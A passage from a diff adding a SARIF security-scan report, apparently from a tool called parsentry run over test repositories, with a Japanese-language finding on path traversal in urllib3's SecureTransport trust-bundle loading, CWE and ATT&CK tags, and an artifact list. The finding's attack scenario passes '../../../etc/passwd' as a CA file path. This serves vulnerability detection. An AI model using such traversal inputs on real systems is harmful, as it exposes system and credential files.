許可されたディレクトリのみからの読み込みに制限\n2. **パス正規化**: `os.path.abspath()` と許可ディレクトリの比較\n3. **パストラバーサル対策**: パスに `../` や `..\\\\` が含まれていないことの確認\n4. **アクセス制御**: ファイルのパーミッションの検証\n",
+            "markdown": "## 脆弱性分析: 任意ファイル操作\n\n### 概要\nPrincipal（trust_bundle パラメータ）が、セキュリティコントロール不足でリソース（ファイルシステムアクセス）に到達しています。\n\n### PARフレームワークの観点\n\n**Principal**: \n- `load_verify_locations()` メソッドを通じて`cafile`パラメータとしてユーザーから供給される文字列\n- 信頼できない外部ソース：アプリケーション設定、ユーザー入力など\n\n**Action（不十分なセキュリティコントロール）**:\n- `os.path.isfile(trust_bundle)` による存在確認のみ\n- パスのサニタイゼーション、ホワイトリスト検証、パストラバーサル対策がない\n- 相対パスや `../` を含むパスの検証がない\n\n**Resource**:\n- `open(trust_bundle, \"rb\")` によるファイルシステムへの読み込みアクセス\n- 任意のファイルが読み込まれる可能性がある\n\n### 脆弱性の詳細\n\n1. **Local File Inclusion (LFI)**: ユーザーが制御可能なファイルパスが直接使用される\n2. **Path Traversal**: `../` や絶対パスを使用して、予期しないファイルへのアクセスが可能\n3. **信頼バウンダリの問題**: `load_verify_locations()` で設定されたパスが、後に検証なく使用される\n\n### 攻撃シナリオ\n\n```python\nctx = SecureTransportContext(ssl.PROTOCOL_TLS)\n# 攻撃者が任意のファイルパスを指定\nctx.load_verify_locations(cafile=\"../../../etc/passwd\")\n# 後続の接続で _evaluate_trust が呼び出され、任意ファイルが読み込まれる\n```\n\n### 推奨される修復\n\n1. **ホワイトリスト検証**: 許可されたディレクトリのみからの読み込みに制限\n2. **パス正規化**: `os.path.abspath()` と許可ディレクトリの比較\n3. **パストラバーサル対策**: パスに `../` や `..\\\\` が含まれていないことの確認\n4. **アクセス制御**: ファイルのパーミッションの検証\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/repositories/white-rabbit/src/urllib3/contrib/securetransport.py",
+                  "index": 44
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "3d4d1625c155934"
+          },
+          "properties": {
+            "confidence": 0.7,
+            "mitre_attack": [
+              "T1083",
+              "T1005"
+            ],
+            "cwe": [
+              "CWE-22",
+              "CWE-73"
+            ],
+            "owasp": [
+              "A01:2021-Broken Access Control"
+            ],
+            "principal": "trust_bundle パラメータ（load_verify_locations() を通じてユーザー提供）",
+            "action": "os.path.isfile() による存在確認のみ。パストラバーサルやパス正規化の検証なし",
+            "resource": "ファイルシステムの読み込みアクセス（open(trust_bundle, 'rb')）",
+            "data_flow": "load_verify_locations(cafile) → _trust_bundle → _custom_validate(trust_bundle) → _evaluate_trust(trust_bundle) → open(trust_bundle)"
+          }
+        }
+      ],
+      "artifacts": [
+        {
+          "location": {
+            "uri": "repo/gitea/giteacasc/gitea.py",
+            "index": 0
+          },
+          "mime_type": "text/x-python"
+        },
+        {
+          "location": {
+            "uri": "repo/gitea/giteacasc/gitea.py",
+            "index": 1
+          },
+          "mime_type": "text/x-python"
+        },
+        {
+          "location": {
+            "uri": "repo/gitea/giteacasc/gitea.py",
+            "index": 2
+          },
+          "mime_type": "text/x-python"
+        },
+        {
+          "location": {
+            "uri": "repo/gitea/repositories/dodo/docs/en/docs/js/custom.js",
+            "index": 3
+          },
+          "mime_type": "application/javascript"
+        },
+        {
+          "location": {
+            "uri": "repo/gitea/repositories/dodo/docs/en/docs/js/custom.js",
+            "index": 4
+          },
+          "mime_type": "application/javascript"
+        },
+        {
+          "location": {
+            "uri": "repo/gitea/repositories/dodo/docs/en/docs/js/custom.js",
+            "index": 5
+          },
+          "mime_type": "application/javascript"
+        },
+        {
+          "location": {
+            "uri": "repo/gitea/repositories/dodo/docs/en/docs/js/custom.js",
+            "index": 6
+          },
+          "mime_type": "application/javascript"
+        },
+        {
+          "location": {
+            "uri": "repo/gitea/repositories/mad-hatter/yagmail/oauth2.py",
+            "index": 7
+          },
+          "mime_type": "text/x-python"
+        },
+        {
+          "location": {
+            "uri": "repo/gitea/repositories/dodo/docs/en/docs/js/custom.js",
+            "index": 8
+          },
+          "mime_type": "application/javascript"
+        },
+        {
+          "location": {
+            "uri": "repo/ctfd/data/CTFd/export.py",
+            "index": 9
+          },
+          "mime_type": "text/x-python"
+        },
+        {
+          "location": {
+            "uri": "repo/gitea/repositories/dodo/docs/en/docs/js/custom.js",
+            "index": 10
+          },
+          "mime_type": "application/javascript"
+        },
+        {
+          "location": {
+            "uri": "repo/gitea/repositories/dodo/docs/en/docs/js/custom.js",
+            "index": 11
+          },
+          "mime_type": "application/javascript"
+        },
+        {
+          "location": {
+            "uri": "repo/gitea/repositories/mad-hatter/yagmail/oauth2.py",
+            "index": 12
+          },
+          "mime_type": "text/x-python"
+        },
+        {
+          "location": {
+            "uri": "repo/gitea/repositories/dodo/main.tf",
+            "index": 13
+          },
+          "mime_type": "text/x-terraform"
+        },
+        {
+          "location": {
+            "uri": "repo/gitea/repositories/dodo/main.tf",
+            "index": 14
+          },
+          "mime_type": "text/x-terraform"
+        },
+        {
+          "location": {
+            "uri": "repo/gitea/repositories/dodo/main.tf",
+            "index": 15
+          },
+          "mime_type": "text/x-terraform"
+        },
+        {
+          "location": {
+            "uri": "repo/gitea/repositories/mock-turtle/eel/__init__.py",
+            "index": 16
+          },
+          "mime_type": "text/x-python"
+        },
+        {
+          "location": {
+            "uri": "repo/gitea/repositories/cheshire-cat/sanic/reloader_helpers.py",
+            "index": 17
+          },
+          "mime_type": "text/x-python"
+        },
+        {
+          "location": {
+            "uri": "repo/gitea/repositories/mock-turtle/eel/__init__.py",
+            "index": 18
+          },
+          "mime_type": "text/x-python"
+        },
+        {
+          "location": {
+            "uri": "repo/ctfd/data/CTFd/utils/exports/__init__.py",
+            "index": 19
+          },
+          "mime_type": "text/x-python"
+        },
+        {
+          "location": {
+            "uri": "repo/ctfd/data/CTFd/utils/exports/__init__.py",
+            "index": 20
+          },
+          "mime_type": "text/x-python"
+        },
+        {
+          "location": {
+            "uri": "repo/ctfd/data/CTFd/themes/core/assets/js/pages/setup.js",
+            "index": 21
+          },
+          "mime_type": "application/javascript"
+        },
+        {
+          "location": {
+            "uri": "repo/ctfd/data/CTFd/utils/exports/__init__.py",
+            "index": 22
+          },
+          "mime_type": "text/x-python"
+        },
+        {
+          "location": {
+            "uri": "repo/ctfd/data/CTFd/CTFd/__init__.py",
+            "index": 23
+          },
+          "mime_type": "text/x-python"
+        },
+        {
+          "location": {
+            "uri": "repo/ctfd/data/CTFd/CTFd/utils/__init__.py",
+            "index": 24
+          },
+          "mime_type": "text/x-python"
+        },
+        {
+          "location": {
+            "uri": "repo/ctfd/data/CTFd/CTFd/utils/exports/__init__.py",
+            "index": 25
+          },
+          "mime_type": "text/x-python"
+        },
+        {
+          "location": {
+            "uri": "repo/ctfd/data/CTFd/CTFd/utils/exports/__init__.py",
+            "index": 26
+          },
+          "mime_type": "text/x-python"
+        },
+        {
+          "location": {
+            "uri": "repo/ctfd/data/CTFd/CTFd/utils/exports/__init__.py",
+            "index": 27
+          },
+          "mime_type": "text/x-python"
+        },
+        {
+          "location": {
+            "uri": "repo/ctfd/data/CTFd/CTFd/themes/core/assets/js/pages/setup.js",
+            "index": 28
+          },
+          "mime_type": "application/javascript"
+        },
+        {
+          "location": {
+            "uri": "repo/ctfd/data/CTFd/themes/admin/assets/js/pages/configs.js",
+            "index": 29
+          },
+          "mime_type": "application/javascript"
+        },
+        {
+          "location": {
+            "uri": "repo/ctfd/data/CTFd/themes/admin/assets/js/pages/challenge.js",
+            "index": 30
+          },
+          "mime_type": "application/javascript"
+        },
+        {
+          "location": {
+            "uri": "repo/gitea/repositories/dodo/main.tf",
+            "index": 31
+          },
+          "mime_type": "text/x-terraform"
+        },
+        {
+          "location": {
+            "uri": "repo/gitea/repositories/mad-hatter/yagmail/oauth2.py",
+            "index": 32
+          },
+          "mime_type": "text/x-python"
+        },
+        {
+          "location": {
+            "uri": "repo/gitea/repositories/reportcov/ci/bootstrap.py",
+            "index": 33
+          },
+          "mime_type": "text/x-python"
+        },
+        {
+          "location": {
+            "uri": "repo/ctfd/data/CTFd/themes/admin/assets/js/pages/configs.js",
+            "index": 34
+          },
+          "mime_type": "application/javascript"
+        },
+        {
+          "location": {
+            "uri": "repo/ctfd/data/CTFd/themes/admin/assets/js/pages/configs.js",
+            "index": 35
+          },
+          "mime_type": "application/javascript"
+        },
+        {
+          "location": {
+            "uri": "repo/ctfd/data/CTFd/CTFd/themes/admin/assets/js/pages/configs.js",
+            "index": 36
+          },
+          "mime_type": "application/javascript"
+        },
+        {
+          "location": {
+            "uri": "repo/ctfd/data/CTFd/CTFd/themes/admin/assets/js/pages/configs.js",
+            "index": 37
+          },
+          "mime_type": "application/javascript"
+        },
+        {
+          "location": {
+            "uri": "repo/ctfd/data/CTFd/CTFd/themes/admin/assets/js/pages/configs.js",
+            "index": 38
+          },
+          "mime_type": "application/javascript"
+        },
+        {
+          "location": {
+            "uri": "repo/ctfd/data/CTFd/CTFd/themes/admin/assets/js/pages/configs.js",
+            "index": 39
+          },
+          "mime_type": "application/javascript"
+        },
+        {
+          "location": {
+            "uri": "repo/ctfd/data/CTFd/CTFd/themes/admin/assets/js/pages/configs.js",
+            "index": 40
+          },
+          "mime_type": "application/javascript"
+        },
+        {
+          "location": {
+            "uri": "repo/ctfd/data/CTFd/CTFd/themes/admin/assets/js/pages/configs.js",
+            "index": 41
+          },
+          "mime_type": "application/javascript"
+        },
+        {
+          "location": {
+            "uri": "repo/gitea/repositories/white-rabbit/src/urllib3/contrib/securetransport.py",
+            "index": 42
+          },
+          "mime_type": "text/x-python"
+        },
+        {
+          "location": {
+            "uri": "repo/gitea/repositories/white-rabbit/src/urllib3/util/ssl_.py",
+            "index": 43
+          },
+          "mime_type": "text/x-python"
+        },
+        {
+          "location": {
+            "uri": "repo/gitea/repositories/white-rabbit/src/urllib3/contrib/securetransport.py",
+            "index": 44
+          },
+          "mime_type": "text/x-python"
+        }
+      ],
+      "invocation": {
+        "executionSuccessful": true
+      }
+    }
+  ]
+}
